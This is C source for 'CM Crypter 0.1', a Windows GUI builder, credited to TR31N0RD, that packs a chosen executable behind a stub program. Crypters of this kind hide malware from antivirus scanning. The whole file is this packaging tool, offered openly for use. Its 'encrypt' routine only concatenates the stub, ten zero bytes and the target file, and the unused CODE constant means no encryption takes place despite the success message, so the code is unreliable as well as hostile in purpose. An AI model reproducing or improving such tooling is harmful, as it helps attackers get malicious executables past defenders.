#include <windows.h>
#include <fstream>
#include <stdio.h>

#define CODE 144

/*
  ###### ##     ##          ##          ###    ########   ######  
##    ## ###   ###          ##         ## ##   ##     ## ##    ## 
##       #### ####          ##        ##   ##  ##     ## ##       
##       ## ### ##          ##       ##     ## ########   ######  
##       ##     ##          ##       ######### ##     ##       ## 
##    ## ##     ##          ##       ##     ## ##     ## ##    ## 
 ######  ##     ##          ######## ##     ## ########   ######  
  
Autor:      TR31N0RD
Name:       CM Crypter
Verion:     0.1
Mail:       tr31n0rd@hotmail.com
Team:       CM LABS
*/

char *Stub,File[MAX_PATH],Save[MAX_PATH];
HWND hClient;
OPENFILENAME  ofn;


enum{ID_BUTTON1=0,ID_BUTTON2=1,ID_S1=2,ID_ARCHIVO1=3};


LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);


char szClassName[ ] = "Windows";

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)

{
    HWND hwnd;               
    MSG messages;            
    WNDCLASSEX wincl;        


    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;      
    wincl.style = CS_DBLCLKS;                 
    wincl.cbSize = sizeof (WNDCLASSEX);


    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;                 
    wincl.cbClsExtra = 0;                      
    wincl.cbWndExtra = 0;                      
    
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND+2;

    
    if (!RegisterClassEx (&wincl))
        return 0;

    
    hwnd = CreateWindowEx (
           0,                   
           szClassName,         
           "CM Crypter 0.1",     
           WS_OVERLAPPEDWINDOW, 
           CW_USEDEFAULT,       
           CW_USEDEFAULT,       
           460,                 
           230,                 
           HWND_DESKTOP,        
           NULL,                
           hThisInstance,       
           NULL                 
           );
           
           
    memset(&ofn,0,sizeof(ofn));
    ofn.lStructSize     = sizeof(ofn);
    ofn.hwndOwner       = NULL;
    ofn.hInstance       = hThisInstance;
    ofn.lpstrFilter     = "Executables\0*.exe\0\0";
    ofn.nMaxFile        = MAX_PATH;
    ofn.Flags           = OFN_NONETWORKBUTTON | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;

    ShowWindow (hwnd, nFunsterStil);

    
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }

    return messages.wParam;
}



char *GetPath()
{
    char *Temp;
    Temp=(char*)malloc(MAX_PATH);
    int c=0,i=0,j;
    GetModuleFileName(0,Temp,MAX_PATH);
    
    while(Temp[c]!='\0')
    {
        if(Temp[c]=='\\'){i=c;}
        c++;
    }
    
    j=c+1;
    c=i+1;
    while(c<j)
    {
        Temp[c]=0;
        c++;
    }
    strcat(Temp,"Stub.exe");
    return Temp;
}



int Cifrar()
{
    char *Buffer;
    int c,i;
    int Size=0,Size1=0,Size2=0;
    Stub=GetPath();
    FILE *pStub,*pFile,*pSave;
    if(!(pStub=fopen(Stub,"rb"))){MessageBox(0,"Error: Stub.exe NO Encontrado","[X] CM Crypter",0); return 1;}
    pSave = fopen (Save,"wb");
    pFile = fopen (File,"rb");
    
    //Agregando el Stub   
    while( (c=getc(pStub))!=EOF)
    {
        fwrite(&c,1,1,pSave);    
    }
    
    //Agregando 10 bytes
    c=0;
    for(int i=0;i<10;i++){fwrite(&c,1,1,pSave);}
    
    //Agregando el Archivo
    while( (c=getc(pFile))!=EOF)
    {
        fwrite(&c,1,1,pSave);
    }
    fclose(pFile);    
    fclose(pSave);
    fclose(pStub);
    MessageBox(0,"Archivo Cifrado Correctamente, Disfruta de tu CM","CM Crypter",0);
}

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                  
    {
        case WM_CREATE:
            CreateWindowEx(0,"STATIC", "Archivo: ", WS_VISIBLE | WS_CHILD, 10, 40, 70, 20,hwnd, (HMENU)(ID_S1), NULL, NULL);
            CreateWindow("EDIT","",WS_OVERLAPPED | ES_AUTOHSCROLL | WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS | WS_TABSTOP | WS_EX_NOPARENTNOTIFY | WS_EX_CLIENTEDGE | WS_EX_LEFT | WS_EX_LTRREADING | WS_EX_RIGHTSCROLLBAR,10,65,400,20,hwnd,(HMENU)(ID_ARCHIVO1),NULL,NULL);
            CreateWindowEx(0,"BUTTON", "...",WS_CHILD | WS_VISIBLE | WS_TABSTOP, 420, 65, 20, 20,hwnd, (HMENU)ID_BUTTON1, NULL, NULL);
            CreateWindowEx(0,"BUTTON", "Cifrar!",WS_CHILD | WS_VISIBLE | WS_TABSTOP, 180, 160, 70, 25,hwnd, (HMENU)ID_BUTTON2, NULL, NULL);
            hClient=hwnd;
            break;
            
        case WM_COMMAND:
            switch (LOWORD(wParam))
            {
                case ID_BUTTON1:
                    ofn.lpstrTitle      = "Seleccione El Primer Archivo";
                    ofn.lpstrFile       = File;
                    if (!GetOpenFileName(&ofn)) return(0);
                    SetWindowText(GetDlgItem(hClient,ID_ARCHIVO1),File);
                break;
                    
                case ID_BUTTON2:
                    ofn.lpstrFile       = Save;
                    if(File[0]=='\0'){MessageBox(0,"Error: Debe Seleccionar El Archivo A Cifrar","[X] CM Crypter",0); break;}
                    if (!GetSaveFileName(&ofn)) return(0);
                    if(Save[0]=='\0'){break;}
                    Cifrar();
                break;    
            }
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);       
            break;
            
        default:                      
            return DefWindowProc (hwnd, message, wParam, lParam);
    }
    return 0;
}
